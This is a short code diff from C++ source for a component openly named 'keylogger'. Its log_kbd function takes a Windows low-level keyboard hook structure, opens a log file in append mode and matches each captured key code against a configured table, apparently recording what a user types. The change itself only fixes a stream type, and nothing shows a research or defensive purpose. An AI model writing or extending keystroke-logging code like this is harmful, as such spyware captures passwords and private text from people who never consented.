@@ -5,7 +5,7 @@
 
 void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
-    std::wofstream out_file{ configuration::out_file, std::ofstream::app };
+    std::wofstream out_file{ configuration::out_file, std::wofstream::app };
 
     if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.cend())
     {
